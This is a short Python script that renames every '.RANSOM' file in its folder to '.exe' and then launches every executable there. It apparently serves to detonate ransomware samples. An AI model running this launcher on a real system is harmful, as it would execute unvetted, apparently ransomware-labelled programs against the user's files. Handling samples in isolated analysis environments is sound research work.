import glob, os
def main():
	for fn in glob.glob("*.RANSOM"):
		os.rename(fn, fn + '.exe')
		print("Renaming " + fn + " to " + fn + ".exe")
	for fn in glob.glob("*.exe"):
		os.startfile(fn)
		print("Running " + fn)
main();